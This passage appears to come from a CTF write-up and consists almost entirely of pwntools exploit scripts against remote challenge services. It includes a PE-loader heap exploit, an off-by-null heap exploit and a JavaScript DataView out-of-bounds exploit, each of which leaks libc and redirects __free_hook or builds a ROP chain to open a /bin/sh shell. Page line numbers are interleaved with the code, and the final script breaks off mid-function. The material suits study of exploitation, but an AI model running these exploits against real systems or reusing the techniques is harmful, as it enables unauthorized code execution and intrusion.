    p.sendline(str(idx))
def edit(p, idx, name, vaddr, size, data):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('name: ')
    p.send(name)
    p.recvuntil('vaddr: ')
    p.sendline(str(vaddr))
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.send(data)
def gen_section_header(virtual_address, size_of_raw_data, 
pointer_to_raw_data):
    section_header = b'a'*0xc + p32(virtual_address) + 
p32(size_of_raw_data) + p32(pointer_to_raw_data)
    section_header = section_header.ljust(0x28, b'\x00')
    return section_header
def main():
    libc = ELF('./libc-2.23.so', checksec=False)
    p = remote('119.3.81.43', 2399)
    #p = process('./loader')
    dos_header = b'MZ'.ljust(0x3c, b'\x00') + p32(0x40)
    secNumber = 1
    fileHeader = p16(0x14c) + p16(secNumber)
    fileHeader = fileHeader.ljust(0x14, b'\x00')
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
    payload += gen_section_header(0, 0, 0)
    my_load(p, 0, b'plusls\n', len(payload), payload)
    my_load(p, 1, b'plusls\n', len(payload), payload)
    delete(p, 1)
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
    payload += gen_section_header(0x168, 0, 0)
    payload = payload.ljust(0x1f8, b'\x00')
    my_load(p, 1, b'plusls\n', len(payload + b'a'*0x10), payload + 
b'a'*0x10)
    delete(p, 0)
    dos_header = b'MZ'.ljust(0x3c, b'\x00') + p32(0x40)
    secNumber = 2
    fileHeader = p16(0x14c) + p16(secNumber)
    fileHeader = fileHeader.ljust(0x14, b'\x00')
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
    payload += gen_section_header(0, 0x188, 0)
    data = b'z'*0x1f0
    data = encrypt_data(data, 1)
    payload += gen_section_header(0, len(data), len(dos_header + 
pe_header) + 0x28*2)
    payload += data
    payload = payload.ljust(0x6f0, b'\x00')
    my_load(p, 0, b'plusls\n', len(payload), payload)
    run(p, 1)
    p.recvuntil(b'z'*0x60)
    libc_base = u64(p.recvuntil(' is running', drop=True).ljust(8, 
b'\x00')) - 0x3c4cd8
    libc.address = libc_base
    log.success('{:#x}'.format(libc_base))
    my_load(p, 2, b'plusls\n', 0x18, b'a'*0x18)
    dos_header = b'MZ'.ljust(0x3c, b'\x00') + p32(0x40)
    secNumber = 1
    fileHeader = p16(0x14c) + p16(secNumber)
    fileHeader = fileHeader.ljust(0x14, b'\x00')
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
    payload += gen_section_header(0, 0, 0)
    my_load(p, 2, b'fuck1\n', len(payload), payload)
    my_load(p, 3, b'fuck2\n', len(payload), payload)
    delete(p, 3)
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
PwnCTFM
off by null
    payload += gen_section_header(0x168, 0, 0)
    payload = payload.ljust(0x1f8, b'\x00')
    my_load(p, 3, b'fuck2\n', len(payload + b'a'*0x10), payload + 
b'a'*0x10)
    delete(p, 2)
    dos_header = b'MZ'.ljust(0x3c, b'\x00') + p32(0x40)
    secNumber = 2
    fileHeader = p16(0x14c) + p16(secNumber)
    fileHeader = fileHeader.ljust(0x14, b'\x00')
    pe_header = b'PE\x00\x00' + fileHeader
    pe_header = pe_header.ljust(0xf8, b'\x00')
    payload = dos_header + pe_header
    payload += gen_section_header(0, 0x188, 0)
    data = b'F'*0x190 + b'q'*0x30 + p64(libc.sym['__free_hook'] + 0x8) + 
p64(0) + p64(libc.sym['__free_hook']) + p64(0x1000)
    data = encrypt_data(data, 1)
    payload += gen_section_header(0, len(data), len(dos_header + 
pe_header) + 0x28*2)
    payload += data
    payload = payload.ljust(0x6f0, b'\x00')
    my_load(p, 2, b'plusls\n', len(payload), payload)
    edit(p, 3, b'plusls\n', 0, 0x10, p64(libc.sym['system']) + 
b'/bin/sh\x00')
    delete(p, 3)
    p.interactive()
def encrypt_data(data, ch):
    ret = b''
    for i in range(len(data)):
        ret += p8(((data[i] - i) % 256) ^ ch ^ 0x39)
    return ret
if __name__ == '__main__':
    main()
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
#coding=utf8
from pwn import *
context.log_level='debug'
1
2
3
# p = process('./pwn')
p = remote('119.3.81.43',49155)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def add(name,size,des,score=None):
    p.sendline('1')
    p.sendafter('name:',name)
    p.sendlineafter("size",str(size))
    p.sendafter('des:',des)
    if score is not None:
        p.sendlineafter("score",str(score))
def dele(i):
    p.sendline('2')
    p.sendlineafter('index',str(i))
def show(i):
    p.sendline('3')
    p.sendlineafter('index',str(i))
p.sendlineafter('name','CTFM')
p.sendlineafter('password',"123456")
# launch_gdb()
add('aaa',0xf8,'aaa',114514)
for _ in xrange(7):
    add('aaa',0xf8,'aaa',114514)
add('aaa',0xf8,'aaa',114514)
add('aaa',0x20,'aaa',114514)
for i in xrange(6):
    dele(7)
    add('aaa',0xf8,'a'*(0xf8-i),114514)
dele(7)
add('aaa',0xf8,'a'*0xf1 + '\x08',114514)
dele(7)
add('aaa',0xf8,'a'*0xf0,114514)
for i in xrange(1,8):
    dele(i)
dele(0)
dele(9)
dele(8)
for i in xrange(8):
    add('aaa',0xf8,'/bin/sh\x00',114514)
show(6)
p.recvuntil('des:')
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
no1
leak_libc = u64(p.recv(6) + '\x00\x00') - 4111520
log.info('leak libc ' + hex(leak_libc))
dele(7)
dele(5)
add('aaa',0x118,'a' * 0x100 + p64( 
leak_libc+libc.symbols['__free_hook']),114514)
add('aaa',0xf8,p64( leak_libc+libc.symbols['system']),114514)
add('aaa',0xf8,p64( leak_libc+libc.symbols['system']),114514)
dele(0)
p.interactive()
50
51
52
53
54
55
56
57
58
from pwn import *
context.log_level="debug"
def code(s):
  #p.recvuntil("code> ")
  p.sendline(s)
#p=process(["python2","/home/kirin/CTF/pwn2.py"])
#p.interactive()
p=remote("119.3.81.43",1338)
pay1='''var buffer = new ArrayBuffer(8);var kirin = new 
DataView(buffer,0);heap=kirin.getBigUint64(0x50,true);print(heap.toString(1
6));1
kirin.setBigUint64(0x50,heap-BigInt(0x110+0x20),true)
elf=kirin.getBigUint64(0,1)
print(elf.toString(16));1
kirin.setBigUint64(0x130+0x50,heap,true);1
kirin.setBigUint64(0x50,elf-BigInt(0x55555555d203-0x5555555BDDD0),true)
libc=kirin.getBigUint64(0,1)-BigInt(0x9d850)
kirin.setBigUint64(Number(heap-(elf-BigInt(0x55555555d203-
0x5555555BDDD0))+BigInt(0x50)),heap,true);stack=kirin.getBigUint64(0x228,1)
print(libc.toString(16));1
kirin.setBigUint64(0x50,libc+BigInt(0x1ef2e0-0x10),true)
stack=kirin.getBigUint64(0,1)
print(stack.toString(16));1
var buffer2 = new ArrayBuffer(8);kirin2 = new DataView(buffer2,0);
heap=kirin2.getBigUint64(0x18,true);print(heap.toString(16));1
kirin2.setBigUint64(0x18,stack-BigInt(0x7fffffffe0d0-0x7fffffffdfb8),true)
kirin2.setBigUint64(0,libc+BigInt(0x26b72),true)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
easypwn
kirin2.setBigUint64(8,stack-BigInt(0x7fffffffe0d0-0x7fffffffdfb8-
0x30),true)
kirin2.setBigUint64(0x10,libc+BigInt(0x26b73),true)
kirin2.setBigUint64(0x18,libc+BigInt(0x0000000000055410),true)
kirin2.setUint32(0x20,0x2f62696e,0)
kirin2.setUint32(0x24,0x2f736800,0)
kirin2.setUint32(0x28,0x616700,0)
'''.strip().split("\n")
for i in pay1:
   code(i)
code("EOF")
p.interactive()
28
29
30
31
32
33
34
35
36
37
38
from pwn import *
context.log_level = 'debug'
def cmd1(s):
    p.sendlineafter(">>", str(s))
def cmd2(s):
    p.sendlineafter(":", str(s))
def cmd3(s):
    p.sendafter(":", str(s))
def new(phone, name, size, note):
    cmd1(1)
    cmd2(phone)
    cmd2(name)
    cmd2(size)
    cmd3(note)
def free(index):
    cmd1(2)
    cmd2(index)
def show(index):
    cmd1(3)
    cmd2(index)
def edit(index, phone, name, note):
    cmd1(4)